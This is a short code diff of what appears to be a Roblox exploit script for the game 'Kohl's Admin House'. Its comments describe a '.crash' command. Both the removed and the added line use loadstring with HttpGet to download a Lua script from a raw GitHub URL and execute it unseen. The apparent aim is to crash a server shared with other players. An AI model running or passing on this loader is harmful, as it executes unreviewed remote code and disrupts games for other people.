@@ -1,5 +1,4 @@
 -- only for kohls admin house
 -- use .admin before .crash or it wont work
- loadstring(game:HttpGet("https://raw.githubusercontent.com/TwomadJR/ss/main/o"))()
- 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TwomadJR/ss/main/2.lua"))()
  -- credits nto exploits on youtube
